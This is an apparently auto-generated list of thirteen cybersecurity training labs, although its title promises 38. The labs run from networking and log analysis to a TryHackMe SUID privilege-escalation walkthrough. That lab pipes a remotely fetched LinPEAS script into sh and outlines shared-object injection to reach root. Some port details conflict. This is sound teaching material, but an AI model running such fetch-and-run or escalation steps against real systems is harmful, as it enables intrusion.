# Technieum Labs — 38 Hands-On Labs

_Auto-generated from `src/lib/data/labs.ts`. Do not edit by hand — run `npm run docs:generate`._

---

## L01: Key Terms Self-Check Quiz

**Week 1** · Module `m1` · Self / Notion · easy

Log4Shell (CVE-2021-44228) is the example this lab keeps coming back to: a vulnerability whose CVSS score, CWE-502 lineage, and blast radius you need to be able to state cold, not look up mid-incident. This lab drills the six terms every later module assumes you already know — CIA Triad, CVE, CWE, IOC, APT, Zero-Day — by pairing each with a real, current example: Log4Shell's CVSS score and CWE-502 lineage, IOC types SOC analysts hunt against MITRE ATT&CK technique T1059, two TTPs attributed to APT29, and how Stuxnet or EternalBlue were eventually caught. You finish able to produce a crisp, example-backed definition for each term on demand — in an interview, on a call, or in an incident write-up — instead of just recognizing it in a list.

**Completion evidence:** A screenshot or exported note file showing all 6 written definitions (CIA Triad, CVE, CWE, IOC, APT, Zero-Day), each paired with a specific real-world example (a named CVE ID, a named APT group, etc.), with a line confirming the answers were checked against the glossary.

**Instructions:**

1. Without looking at the Glossary, write a one-sentence definition from memory for each of: CIA Triad, CVE, CWE, IOC, APT, Zero-Day
2. For CVE: look up one real CVE on cve.org (e.g. CVE-2021-44228, Log4Shell) and note its affected product, its CWE category, and its CVSS score
3. For CWE: find that CVE's linked CWE entry on cwe.mitre.org/top25 and explain in one sentence what class of bug it represents (e.g. CWE-502, deserialization of untrusted data)
4. For IOC: using MITRE ATT&CK (attack.mitre.org) as reference, list 3 concrete IOC types a SOC analyst would hunt for in a SIEM for one technique (e.g. T1059 command execution) — a hash, an IP, a registry key
5. For APT: pick one real APT group tracked in MITRE ATT&CK (e.g. APT29) and list two TTPs officially attributed to it
6. For Zero-Day: find one historical zero-day (e.g. Stuxnet, EternalBlue) and note how it was eventually discovered or patched
7. Check all six definitions against the Module 1 Glossary tab and correct any vague or wrong wording
8. Explain each term out loud, in your own words, to another person or a recorded voice memo — if you stumble, rewrite that definition until you don't
9. Save your six definitions plus six real-world examples as one note file for your training portfolio

**Resources:**

- [CVE Program (cve.org)](https://www.cve.org) _(link)_
- [CWE Top 25 Most Dangerous Software Weaknesses](https://cwe.mitre.org/top25/) _(link)_
- [MITRE ATT&CK](https://attack.mitre.org) _(link)_
- [NIST NICE Framework Glossary of Terms](https://www.nist.gov/itl/applied-cybersecurity/nice/nice-framework-resource-center/nice-framework-glossary-terms) _(link)_
- [Professor Messer Security+ SY0-701 (free video course)](https://www.professormesser.com/sy0-701-certification-course/) _(video)_
- [cve.mitre.org](https://cve.mitre.org) _(link)_
- [CWE (cwe.mitre.org)](https://cwe.mitre.org) _(link)_

---

## L02: Portal Orientation: Foundations Walkthrough (start)

**Week 1** · Module `m1` · In-House Portal · easy

Every later Module 2 and 3 lab assumes you can already read a client-server exchange and drive a Linux terminal without hand-holding — trainees who skip that foundation are consistently the ones who stall out once labs stop explaining themselves. This lab tours the portal's own Module 0 (hardware fundamentals), Module 1 (cybersecurity fundamentals — CIA Triad, CVE, CWE, IOC, APT, Zero-Day), and Module 2 (networking) material, then has you complete this course's own local intro labs — L01's Key Terms quiz, L03's Wireshark capture, L04's subnet calculator, and L05's local networking practice — end to end, entirely in-house, with nothing external to sign up for. You come out with the baseline networking vocabulary (MAC address, DHCP, DNS, the request/response cycle) and command-line muscle memory the rest of the program is built on top of.

**Completion evidence:** Module 0-2 read through in the portal, plus each intro lab's own completion evidence saved: L01's six definitions, L03's labeled capture.pcapng, L04's worked subnet worksheet, and L05's OSI-layer mapping notes.

**Instructions:**

1. Open the portal's Modules tab and read Module 0 (hardware fundamentals: CPU, RAM, ROM, storage, BIOS/UEFI) start to finish
2. Read Module 1 (cybersecurity fundamentals), noting the six terms every later module assumes you already know: CIA Triad, CVE, CWE, IOC, APT, Zero-Day
3. Complete L01 (Key Terms Self-Check Quiz) to turn those six terms into your own example-backed definitions, checked against the Module 1 glossary
4. Read Module 2 (OSI Model, TCP/IP, IP addressing, ports/protocols, MAC/ARP, switches/routers/firewalls, VPNs, NAT)
5. Complete L03 (Wireshark: Capture & Label Traffic by OSI Layer) to see the client-server request/response cycle in traffic you captured yourself
6. Complete L04 (Subnet Calculator Exercise) to hand-calculate network/broadcast addresses and usable host ranges
7. Complete L05 (local networking practice) to map real local tools and protocols to the OSI layers covered in Module 2
8. Write a short note connecting all four intro labs back to their Module 0-2 material, and save it alongside each lab's own evidence

**Resources:**

- [Module 0: Foundations](/modules/m0) _(link)_
- [Module 1: Cybersecurity Fundamentals](/modules/m1) _(link)_
- [Module 2: Networking](/modules/m2) _(link)_
- [This course's labs (L01, L03, L04, L05)](/labs) _(link)_
- [TryHackMe Pre Security path (optional extra practice)](https://tryhackme.com/path/outline/presecurity) _(platform)_
- [TryHackMe VPN/access guide](https://tryhackme.com/access) _(link)_

---

## L03: Wireshark: Capture & Label Traffic by OSI Layer

**Week 2** · Module `m2` · Wireshark · easy

Real network traffic analysis and incident response run on the same three patterns you'll capture here: the ARP broadcast/unicast-reply exchange, the TCP SYN/SYN-ACK/ACK three-way handshake, and a plaintext HTTP request/response — the exact traffic SOC analysts sift through to catch leaked credentials, DNS tunneling, and C2 beaconing. This lab has you capture live traffic in Wireshark, break it down in Statistics > Protocol Hierarchy, then use display filters to isolate and label each of those three patterns and map them back onto the OSI model, right down to following the raw plaintext of an HTTP GET over TCP Stream. An optional extra pass against a real malware pcap from Malware-Traffic-Analysis.net pushes the same filters into an actual investigative context. You walk away able to read a raw packet capture confidently — a hard requirement for any SOC or network security role.

**Completion evidence:** Screenshot of the Wireshark window showing the Protocol Hierarchy statistics plus the packet list with the labeled ARP, DNS, TCP 3-way handshake, and HTTP GET packets visible, alongside the saved .pcapng capture file.

**Instructions:**

1. Download and install Wireshark from wireshark.org/download.html, keeping the Npcap driver installation enabled
2. Start a live capture on your active Wi-Fi or Ethernet interface
3. Generate traffic: visit a non-HTTPS site (e.g. http://neverssl.com), run 'ping 8.8.8.8' in a terminal, and run 'nslookup example.com'
4. Stop the capture, then open Statistics > Protocol Hierarchy to see the percentage breakdown of every protocol you captured
5. Use the display filter bar to isolate and label: one arp packet pair (the broadcast 'who has this IP?' request followed by the unicast reply, exactly as covered in the MAC/ARP topic), one dns query/response pair, the three packets of tcp.flags.syn==1 (SYN, SYN-ACK, ACK — the same handshake covered in the TCP/UDP and URL-flow topics), and one http.request
6. Right-click the HTTP GET request packet -> Follow -> TCP Stream to view the full plaintext request and response, and compare it against the GET / HTTP/1.1 request and HTTP/1.1 200 OK response format from the URL-flow topic
7. For extra practice, download one real pcap from Malware-Traffic-Analysis.net's training exercises page and use the same filters to find the suspicious traffic
8. Save your own capture as capture.pcapng and submit it alongside your labeled packet list

**Resources:**

- [Wireshark download](https://www.wireshark.org/download.html) _(tool)_
- [Wireshark User's Guide](https://www.wireshark.org/docs/wsug_html_chunked/) _(link)_
- [Wireshark Display Filter Reference](https://www.wireshark.org/docs/dfref/) _(link)_
- [Wireshark with Chris Greer (free YouTube playlist)](https://www.youtube.com/playlist?list=PLhfrWIlLOoKO8522T1OAhR5Bb2mD6Qy_l) _(video)_
- [Malware-Traffic-Analysis.net training exercises](https://www.malware-traffic-analysis.net/training-exercises.html) _(platform)_
- [Wireshark](https://www.wireshark.org) _(tool)_

---

## L04: Subnet Calculator Exercise

**Week 2** · Module `m2` · Manual / Online · easy

Subnetting math shows up in almost every entry-level IT/security interview, and it's what lets you read a firewall rule, a VLAN design, or a routing table on the spot, without reaching for a calculator you might not have during a live assessment. This lab has you hand-calculate the network address, broadcast address, and usable host range for five CIDR blocks — from a tight /30 point-to-point link to a /22 — first modeling the method against the module's own worked example of splitting 192.168.1.0/24 into four /26 subnets, then verifying every answer against an online calculator and diagnosing any mismatch by redoing the math step by step. You finish with subnetting math you can do cold, plus a one-line realistic use case for each block size.

**Completion evidence:** A worksheet or screenshot showing all 5 CIDRs with hand-calculated network address, broadcast address, and usable host range, plus a screenshot of the subnettingpractice.com calculator confirming each answer matches.

**Instructions:**

1. Write down the 5 CIDRs: 192.168.1.0/26, 10.0.0.0/22, 172.16.5.0/28, 192.168.100.0/25, 10.10.10.0/30
2. Before calculating your own 5 CIDRs, work through the module's own reference example once: 192.168.1.0/24 split into four /26 subnets of 64 addresses each (192.168.1.0/26 hosts .1-.62, .64/26 hosts .65-.126, .128/26 hosts .129-.190, .192/26 hosts .193-.254) — use this as the model for how the block-size method works before applying it to your harder CIDRs
3. For each, calculate host bits = 32 - prefix, then total addresses = 2^(host bits)
4. Calculate usable hosts = total addresses - 2 (one address reserved for network, one for broadcast)
5. Find the block size / increment (256 - the relevant octet's subnet mask value) to locate where each CIDR's boundary falls
6. Work out the network address (first address in the block) and broadcast address (last address) for each CIDR, showing your working
7. Verify all 5 answers using the subnettingpractice.com subnet calculator, flagging any mismatches
8. For any mismatch (or, if none, pick one CIDR at random), redo the manual math step-by-step to find exactly where your own logic went wrong
9. Write one sentence per CIDR describing a realistic use case (e.g. a /30 for a point-to-point router link, a /26 for a small office VLAN)

**Resources:**

- [Subnetting Practice — subnet calculator](https://subnettingpractice.com/subnet-calculator.html) _(tool)_
- [Subnetting Practice — practice questions](https://subnettingpractice.com/) _(platform)_
- [Professor Messer: Seven-Second Subnetting (Network+ N10-009)](https://www.professormesser.com/network-plus/n10-009/n10-009-video/seven-second-subnetting-n10-009/) _(video)_
- [subnetting.net practice tool](https://www.subnetting.net/) _(tool)_
- [subnettingpractice.com](https://subnettingpractice.com) _(tool)_
- [Professor Messer: Subnetting](https://www.professormesser.com) _(video)_

---

## L05: Local Networking Practice: OSI Layers with Real Tools

**Week 2** · Module `m2` · Local Tools · easy

OSI layers, LAN topologies, encapsulation, and port forwarding stop being theory the moment you have to troubleshoot a real network — this lab turns that M2 material into hands-on practice with nothing but the tools already on your machine, instead of passive reading. You use ip/ifconfig, ping, traceroute, netstat/ss, and nmap (the same scanner driven against a local target in L18) to observe your own interface configuration, trace a route hop by hop, inspect active connections, and scan a local host — mapping a real protocol or device to each of the seven OSI layers and tracing how encapsulation adds a header at every layer going down the stack. Capturing your own traffic in Wireshark alongside at least one exercise ties the theory directly to a packet you generated yourself. You leave able to explain how a LAN, a router, and a VPN tunnel actually move a request end to end.

**Completion evidence:** Five saved terminal outputs — interface config, ping/traceroute, netstat/ss, the OSI-layer-to-protocol mapping, and the local nmap scan against localhost:18080 — plus at least one Wireshark capture tying an exercise to a real packet.

**Instructions:**

1. Open Module 2 (Networking) in the portal and keep it open as a reference alongside each exercise below
2. Interface configuration: run ip a (Linux) or ifconfig (macOS) or ipconfig /all (Windows) and record your own IP address, subnet mask, and default gateway
3. Path tracing: run traceroute 8.8.8.8 (Linux/macOS) or tracert 8.8.8.8 (Windows) and note each hop, then run ping -c 4 8.8.8.8 (or ping -n 4 on Windows) and note the round-trip times
4. Active connections: run netstat -tulpn or ss -tulpn (Linux) or netstat -ano (Windows) and record at least 3 active or listening connections, noting the local port and remote address for each
5. OSI Model: for each of the 7 layers, write down one real protocol or device that operates there, drawing on what ip/ping/traceroute/netstat just showed you (e.g. ARP at L2, IP at L3, TCP/UDP at L4, HTTP/DNS at L7)
6. Encapsulation: note how the traceroute/ping traffic you just generated adds a header at each layer going down the stack, from raw application data to the frame that leaves your NIC
7. Start the DVWA lab from L18 (Start Lab button, dockerImage ghcr.io/digininja/dvwa:latest, containerPort 80) and run nmap -sV -p80 localhost:18080 against it to see a live local port forwarded from a container, then note this in the context of firewalls, port forwarding, and NAT
8. For at least one exercise, capture your own traffic in Wireshark alongside the command you ran to connect the theory to a real packet
9. Save your terminal output for each of the 5 exercises as evidence

**Resources:**

- [Module 2: Networking](/modules/m2) _(link)_
- [L18: Nmap local scan lab](/labs) _(link)_
- [Wireshark User's Guide](https://www.wireshark.org/docs/wsug_html_chunked/) _(link)_
- [TryHackMe Network Fundamentals room series (optional extra practice)](https://tryhackme.com/module/network-fundamentals) _(platform)_
- [TryHackMe Networking Fundamentals](https://tryhackme.com) _(platform)_
- [Professor Messer Networking](https://www.professormesser.com) _(video)_

---

## L06: OverTheWire Bandit Levels 0-10

**Week 3** · Module `m3-linux` · OverTheWire · easy

OverTheWire's Bandit wargame is the single most common 'can this candidate actually use a terminal' filter that junior pentest and SOC roles apply, and every technique it drills — find by size/owner, grep across files, base64 decode — reappears constantly in real post-exploitation enumeration. This lab has you SSH into Bandit Level 0 and fight through to Level 10, where each level hides the next level's password somewhere on the filesystem behind a deliberately awkward obstacle: a filename that's a bare dash, a filename with spaces, a hidden dotfile, one human-readable file among decoys, an exact size-and-permission match across an entire filesystem, and a base64-encoded payload. You finish with core Linux navigation, file discovery, and text-processing commands under your fingers, not just in your notes.

**Completion evidence:** terminal screenshot showing the successful SSH login banner for bandit10@bandit.labs.overthewire.org followed by the plaintext password string recovered for bandit11

**Instructions:**

1. Connect to Level 0: ssh bandit0@bandit.labs.overthewire.org -p 2220 (password: bandit0), then run cat readme to get the Level 1 password
2. Level 1->2: the password file is literally named '-'; read it with cat ./- (a bare dash is interpreted as stdin by cat otherwise)
3. Level 2->3: the filename contains spaces; use quotes or backslash-escapes, e.g. cat "spaces in this filename"
4. Level 3->4: look inside a hidden directory/file with ls -la, since dotfiles don't show under plain ls
5. Level 4->5: one of many files in a directory is the only human-readable one; run file ./-file* | grep ASCII to spot it without opening every file by hand
6. Level 5->6: find the password file by exact size and permission bits within a directory tree: find . -size 1033c ! -executable -type f 2>/dev/null
7. Level 6->7: the file lives somewhere on the whole filesystem, owned by a specific user and group: find / -size 33c -user bandit7 -group bandit6 2>/dev/null
8. Level 7->8: the password sits next to a specific keyword inside a large data file: grep <keyword> data.txt
9. Level 8->9: find the one line that appears exactly once in the data file: sort data.txt | uniq -u
10. Level 9->10: the data is base64-encoded; isolate the encoded string then decode it: base64 -d data.txt, and use the resulting bandit11 login to reach and read the Level 11 password
11. Keep a running notes file (command used -> level solved) and submit a screenshot of the bandit10 login banner plus the password you recovered for Level 11

**Resources:**

- [OverTheWire Bandit](https://overthewire.org/wargames/bandit/) _(platform)_
- [explainshell.com](https://explainshell.com) _(tool)_
- [SS64 Bash A-Z command index](https://ss64.com/bash/) _(link)_

---

## L07: Linux Permissions Challenge: SUID Privilege Escalation

**Week 3** · Module `m3-linux` · TryHackMe · easy

Misconfigured SUID binaries are one of the most common privilege-escalation paths pentesters find after landing an initial low-privilege shell — a single unnecessary rws bit can turn a foothold into full root. In TryHackMe's Linux PrivEsc room you SSH into an intentionally misconfigured Debian VM, enumerate every SUID-root binary with find / -perm -4000, then run LinPEAS to double-check your manual work and cross-reference the list against GTFOBins to spot documented abuse techniques. You then exploit a planted binary, /usr/local/bin/suid-so, via shared-object injection — building a malicious libcalc.so that the binary's dynamic linker loads instead of the legitimate library — to escalate from a standard user straight to uid=0(root). You leave able to read octal permission notation cold, tell a real SUID risk from a false positive, and remediate one yourself with chmod u-s.

**Completion evidence:** terminal screenshot showing `id` returning uid=0(root) immediately after the SUID/shared-object exploit runs, plus a second screenshot of `ls -l` showing the SUID bit removed from the practice binary

**Instructions:**

1. Deploy TryHackMe's Linux PrivEsc room (https://tryhackme.com/room/linuxprivesc), start the attached VM, and connect: ssh user@<TARGET_IP> (password: password321)
2. Run manual SUID enumeration: find / -perm -4000 -type f 2>/dev/null to list every SUID-root binary on the box
3. Download and run LinPEAS from the actively-maintained PEASS-ng project to cross-check your manual list: curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
4. For every unfamiliar SUID binary in the list, look it up on GTFOBins (gtfobins.github.io) to see if it has a documented SUID abuse technique
5. Exploit the room's planted /usr/local/bin/suid-so binary via shared-object injection: build a malicious libcalc.so that sets uid to 0 and spawns a shell, then place it where the binary's dynamic linker will load it first
6. Run the SUID binary and confirm root was obtained with id (expect uid=0(root))
7. On the same VM, pick one genuinely unnecessary SUID bit and remove it: chmod u-s <file>, then confirm with ls -l <file>
8. Before writing up, make sure you can read the octal notation cold: 4=read, 2=write, 1=execute, and the SUID bit itself adds 4000 on top of the normal permission digits (e.g. chmod 4755 sets rwsr-xr-x) — this is what lets you scan a long `find` output and immediately spot which bits are unusual
9. Write up each SUID binary you found: whether GTFOBins lists an abuse technique for it, and whether it was a real risk or a false positive

**Resources:**

- [TryHackMe: Linux PrivEsc](https://tryhackme.com/room/linuxprivesc) _(platform)_
- [GTFOBins](https://gtfobins.github.io) _(link)_
- [PEASS-ng / LinPEAS (GitHub)](https://github.com/peass-ng/PEASS-ng) _(tool)_
- [explainshell.com](https://explainshell.com) _(tool)_
- [HackTricks: Linux Privilege Escalation](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html) _(link)_

---

## L08: Bash Script: Enumerate users, processes & listening ports

**Week 3** · Module `m3-linux` · Bash / Linux VM · medium

Every post-exploitation phase of a real engagement starts with the same question: who can log in, what's running, and what's listening on this box? Rather than blindly pasting LinPEAS output into a report, you write your own Bash enumeration script from scratch — a shebang-first enum.sh that pulls usernames from /etc/passwd, the full process table from ps aux, and listening ports from ss -tulpn into one labeled, reproducible report. Setting the executable bit and piping through tee for a timestamped log is exactly how a real assessor captures evidence during an engagement, not just how a script happens to run. Benchmarking your output against LinPEAS forces you to name precisely what your script misses and why it matters — you leave understanding enumeration well enough to build the tool, not just run someone else's.

**Completion evidence:** terminal output of enum.sh showing three clearly labeled sections in order — user list from /etc/passwd, ps aux process list, and ss -tulpn listening-port list

**Instructions:**

1. Create a new script file: enum.sh, and add #!/bin/bash as the first line so the system knows to run it with bash specifically
2. Add a section that reads /etc/passwd and lists all usernames with cut -d: -f1 /etc/passwd
3. Add a section that runs ps aux to list all running processes
4. Add a section that runs ss -tulpn (or netstat -tulpn if ss isn't installed) to list listening ports and the process bound to each
5. Add clear section headers (echo "=== Users ===" etc.) so the report is readable, not just raw command dumps
6. Make the script executable with chmod +x enum.sh before attempting to run it directly as ./enum.sh
7. Pipe the full script's output through tee to save a timestamped report file as well as print to screen: ./enum.sh | tee enum_report_$(date +%F).txt
8. Run LinPEAS (https://github.com/peass-ng/PEASS-ng) on the same box and compare: list 2-3 checks it performs that your script doesn't, and explain why each matters

**Resources:**

- [explainshell.com](https://explainshell.com) _(tool)_
- [Bash scripting cheat sheet (devhints.io)](https://devhints.io/bash) _(link)_
- [SS64 Bash A-Z command index](https://ss64.com/bash/) _(link)_
- [PEASS-ng / LinPEAS (GitHub)](https://github.com/peass-ng/PEASS-ng) _(tool)_

---

## L09: PowerShell Script: List processes, users & scheduled tasks

**Week 4** · Module `m3-windows` · PowerShell · easy

Attackers who gain a foothold on Windows routinely plant scheduled tasks to survive reboots — one of the most common persistence mechanisms defenders have to hunt for during triage. This lab builds the Windows counterpart to Bash-based Linux enumeration: a PowerShell script that lists every running process ranked by CPU with Get-Process | Sort-Object -Property CPU -Descending, enumerates local accounts with Get-LocalUser, and pulls every scheduled task's state and last/next run time with Get-ScheduledTask and Get-ScheduledTaskInfo — the exact fields that expose a recently-modified persistence task. Saving the output from enum.ps1 and benchmarking it against both the legacy wmic command and WinPEAS shows you what a fuller triage catches that a bare script doesn't. You leave able to write native-cmdlet Windows triage scripts without needing a third-party tool at all.

**Completion evidence:** PowerShell console/report screenshot showing four clearly labeled sections in order — Get-Process output, Get-LocalUser output, Get-ScheduledTask output, and scheduled-task last/next run times

**Instructions:**

1. Open PowerShell as Administrator (Get-LocalUser and full task visibility both require elevation)
2. Add a section using Get-Process | Sort-Object -Property CPU -Descending, piped to Out-File for a saved report
3. Add a section using Get-LocalUser | Select-Object Name,Enabled,LastLogon to list local accounts (fall back to net user on non-Windows-10/11 builds where Get-LocalUser isn't available)
4. Add a section using Get-ScheduledTask | Select-Object TaskName,State,TaskPath to list scheduled tasks
5. Add a fourth section using Get-ScheduledTask | Get-ScheduledTaskInfo | Select-Object TaskName,LastRunTime,NextRunTime to spot recently-modified tasks — a common attacker persistence indicator
6. Save the script as enum.ps1, run it end to end, and submit the generated report file
7. Compare your script's output against wmic process list brief (the older CMD-based equivalent) and against WinPEAS (from the same PEASS-ng project used for Linux), noting 2 checks each runs that yours doesn't

**Resources:**

- [Microsoft PowerShell Docs](https://learn.microsoft.com/powershell/) _(link)_
- [SS64 PowerShell reference](https://ss64.com/ps/) _(link)_
- [Get-WinEvent / event log cmdlets reference](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent) _(link)_
- [PEASS-ng / WinPEAS (GitHub)](https://github.com/peass-ng/PEASS-ng) _(tool)_

---

## L10: Windows Fundamentals: Hands-On Tour of Your Own Machine

**Week 4** · Module `m3-windows` · In-House Portal + Your Windows Machine · easy

Junior SOC and helpdesk-to-security interviews test this exact knowledge before anything else: not exploitation technique, but whether you actually know your way around the Windows OS you'll be defending. This lab walks the same three-part fundamentals arc — OS structure and navigation (versions, NTFS, the desktop), system administration (Control Panel, the Registry, resource monitoring), and the built-in security stack (Windows Update, Defender, BitLocker/TPM, and UAC) — entirely against your own Windows machine using this course's Module 3: Windows Basics as the guide, so nothing leaves the portal. You confirm each area by actually opening the tool on your own box (regedit, msinfo32, Task Manager, Windows Security) rather than reading about it, building the baseline fluency every later Windows lab in this program assumes you already have.

**Completion evidence:** Screenshots of real Windows tools opened on your own machine — at least one per area (structure: Explorer/permissions or winver; configuration: regedit or msinfo32; security: Windows Security/Defender or BitLocker status) — plus your notes

**Instructions:**

1. Open this course's Module 3: Windows Basics (m3-windows) — its topics cover exactly the three fundamentals areas below, in order
2. Structure & navigation: on your own machine confirm your Windows edition (winver / Get-ComputerInfo), browse the NTFS filesystem in Explorer, and check file/folder permissions (right-click > Properties > Security)
3. System configuration: open the Registry with regedit and note the main hives, open msinfo32 / run systeminfo, and watch live resource use in Task Manager (Performance tab)
4. Security stack: open Windows Security (Defender) and review protection status, check your BIOS/UEFI + BitLocker/TPM state (manage-bde -status or Get-BitLockerVolume), and observe a UAC prompt when launching an admin task
5. For each area, take notes on any tool or setting you'd never used before
6. Screenshot at least one real tool per area (regedit, msinfo32, Windows Security) on your own machine as evidence

**Resources:**

- [This course — Module 3: Windows Basics](https://learn.microsoft.com/en-us/windows/) _(link)_
- [Microsoft Learn: Windows client documentation](https://learn.microsoft.com/en-us/windows/client-management/) _(link)_
- [TryHackMe Windows Fundamentals rooms (optional extra practice)](https://tryhackme.com/room/windowsfundamentals1xbx) _(platform)_
- [TryHackMe Windows Fundamentals](https://tryhackme.com) _(platform)_
- [Microsoft Docs](https://learn.microsoft.com) _(link)_

---

## L11: Analyse a Windows Event Log for 5 suspicious events

**Week 4** · Module `m3-windows` · Event Viewer · medium

An alert fires, and the first move on any SOC shift is the same: open the relevant event log and reconstruct what actually happened, in what order, using nothing but Event IDs and timestamps. A real training walkthrough shows exactly how much three correlated IDs can reveal: filtering roughly 8,000 entries down to Event ID 11707/1033 exposed a suspicious installer, Event ID 4657 showed it had rewritten the HKCU Run key, and Event ID 1074 confirmed the resulting shutdown-on-login loop. You load a real attack-sample .evtx file into Event Viewer, filter for password-spray patterns (4625/4624), account and privilege changes (4720/4732), and persistence indicators (7045, 4688, 4657), then correlate five flagged Event IDs by timestamp into a written incident timeline. The skill you leave with is exactly this: turning a raw, noisy log into a defensible sequence of what happened and why it's suspicious.

**Completion evidence:** Event Viewer screenshot with the 5 flagged suspicious Event IDs (e.g. 4625, 4720, 4732, 7045, 4688) visible together in the filtered results pane

**Instructions:**

1. Download the sample logs from the Lab Files section above (hosted in-portal — no external download needed). Start with password-spray.evtx
2. Open Event Viewer -> Action -> Open Saved Log and load the .evtx file
3. Filter by Event ID 4625 (failed logon) alongside 4624 (successful logon) to spot a password-spray pattern: many failures across many accounts in a short window, followed by one success
4. Filter by Event ID 4720 (user account created) and 4732 (member added to a security-enabled local group) to catch suspicious account/privilege changes
5. Filter by Event ID 7045 (new service installed) — a classic Windows persistence mechanism
6. Filter by Event ID 11707 (product installation successful) and 1033 (installation detail — Product, Version, Language, Manufacturer fields) to spot an unexpected or suspicious software install, exactly as in the real Totally_Legit_Software.msi training incident where the installer's Manufacturer field itself carried a clue
7. Filter by Event ID 4657 (registry key modification — requires object-access auditing to be enabled) to catch persistence via keys like HKCU\...\Run, and cross-reference with Event ID 1074 (shutdown/restart) if the modification appears to trigger a reboot or shutdown loop
8. Filter by Event ID 4688 (new process created) to review any suspicious process command lines (only populated if command-line auditing is enabled)
9. Look up each flagged Event ID in the Ultimate Windows Security encyclopedia to confirm you're interpreting the fields correctly
10. Correlate the timestamps of your 5 findings into a short written timeline explaining what happened, in what order, and why it's suspicious — install, then registry change, then shutdown is the canonical pattern to look for

**Resources:**

- [SANS DeepBlueCLI (sample evtx files included)](https://github.com/sans-blue-team/DeepBlueCLI) _(tool)_
- [EVTX-ATTACK-SAMPLES (sbousseaden)](https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES) _(tool)_
- [Windows Security Log Encyclopedia (ultimatewindowssecurity.com)](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/) _(link)_
- [Get-WinEvent documentation (Microsoft Learn)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.diagnostics/get-winevent) _(link)_
- [Windows Event ID reference (ultimatewindowssecurity.com)](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia) _(link)_
- [Microsoft Learn: Event Viewer](https://learn.microsoft.com/windows/win32/wes/eventviewer) _(link)_

---

## L12: Inspect & manipulate session cookies with DevTools

**Week 5** · Module `m4` · Browser DevTools · easy

Session hijacking, fixation, and CSRF attacks all start from the same gap: a session token that isn't actually locked down the way its flags claim. Using OWASP Juice Shop's real login flow, you inspect its token cookie in DevTools, check whether HttpOnly, Secure, and SameSite are actually set, and confirm the result directly by running document.cookie in the console — Juice Shop's Angular frontend needs to read the JWT client-side, so this is a realistic case of a session token that is only partially protected. Decoding the JWT with CyberChef exposes the claims inside (email, isAdmin), and tampering the cookie value by hand shows you exactly how the server reacts to a broken token. You leave able to read and reason about real session-management flags — the prerequisite for every session-hijacking, fixation, and CSRF test later in the program.

**Docker:** `docker run -d -p 18080:3000 bkimminich/juice-shop`

**Completion evidence:** browser screenshot showing DevTools Application/Storage panel with the Juice Shop token cookie's HttpOnly/Secure/SameSite flags visible, plus a Console screenshot of the document.cookie result and a short note on the effect of editing the cookie value

**Instructions:**

1. Run OWASP Juice Shop locally: docker run --rm -p 3000:3000 bkimminich/juice-shop, then browse to http://localhost:3000
2. Register an account and log in, then open DevTools (F12) before touching anything else
3. Go to Application (Chrome/Edge) or Storage (Firefox) -> Cookies -> http://localhost:3000 and find the cookie named 'token'
4. Record whether HttpOnly, Secure, and SameSite are set on it — note that Juice Shop's Angular frontend also needs to read the JWT client-side, so this cookie is a realistic case of a session token that is NOT fully locked down
5. In the DevTools Console, run document.cookie and check whether the token value is visible — this tells you whether HttpOnly is actually protecting it
6. Copy the JWT value and decode it with CyberChef's 'JWT Decode' operation (or jwt.io) to see the claims stored inside (email, isAdmin, etc.)
7. In Application -> Cookies, edit the cookie's value directly (change one character), reload the page, and observe how the app responds (logged out, error, or silently ignored)
8. Write 3-5 sentences: which flags were missing, why that matters for XSS/CSRF, and what you'd recommend a dev team change

**Resources:**

- [OWASP Juice Shop (GitHub)](https://github.com/juice-shop/juice-shop) _(tool)_
- [bkimminich/juice-shop (Docker Hub)](https://hub.docker.com/r/bkimminich/juice-shop) _(tool)_
- [MDN: Document.cookie](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie) _(link)_
- [MDN: Using HTTP cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies) _(link)_
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html) _(link)_
- [Chrome DevTools documentation](https://developer.chrome.com/docs/devtools/) _(link)_

---

## L13: Manually encode/decode strings in Base64 & URL encoding

**Week 5** · Module `m5` · CyberChef · easy

A Base64 blob in an HTTP header or a percent-encoded query string in a Burp request is reversible in seconds once you know the alphabet, not a cryptographic wall. This lab has you hand-derive the Base64 encoding of five strings (6-bit chunks, the A-Za-z0-9+/ alphabet, = padding) and the percent-encoding of special characters, then cross-check every result against the terminal and CyberChef's Recipe pane. Chaining URL Encode into URL Decode proves the round-trip is lossless, and saving the recipe as a shareable link is a reminder that both the recipe and your input data are embedded directly in that URL. You leave able to decode Base64 and percent-encoded data on sight without reaching for a tool, and able to explain why "it's encoded" is not the same claim as "it's encrypted."

**Completion evidence:** screenshot showing all 5 strings' manual/terminal Base64 and URL-encoding results matching CyberChef's Recipe output pane exactly, with the decode step confirming round-trip correctness

**Instructions:**

1. Pick 5 short strings of varying length, including at least one with spaces and one with & or = characters
2. For each string, manually work out the Base64 encoding on paper/whiteboard: group into 6-bit chunks and map to the A-Za-z0-9+/ alphabet, padding with = as needed
3. Verify each with the terminal: echo -n 'string' | base64
4. Open CyberChef at https://gchq.github.io/CyberChef/, drag the 'To Base64' operation into the Recipe pane, paste each string into Input, and confirm the Output matches your manual/terminal result
5. Do the same for percent/URL encoding: manually convert each special character to %XX (its hex ASCII value), noting that a space becomes %20 (or + in form-encoded contexts)
6. Verify with CyberChef's 'URL Encode' operation, then chain 'URL Decode' immediately after it in the same recipe to confirm you get the original string back
7. Save one CyberChef recipe as a shareable URL (Recipe pane -> the link icon) and note how the recipe and input are embedded directly in the URL
8. Write one sentence per string explaining a real scenario where you'd need to reverse this encoding (e.g. a URL-encoded query string in a Burp request, a Base64 blob in an HTTP header)

**Resources:**

- [CyberChef](https://gchq.github.io/CyberChef/) _(tool)_
- [CyberChef source (GitHub)](https://github.com/gchq/CyberChef) _(link)_
- [MDN: Percent-encoding glossary](https://developer.mozilla.org/en-US/docs/Glossary/Percent-encoding) _(link)_
- [RFC 4648: The Base16, Base32, and Base64 Data Encodings](https://www.rfc-editor.org/rfc/rfc4648) _(link)_
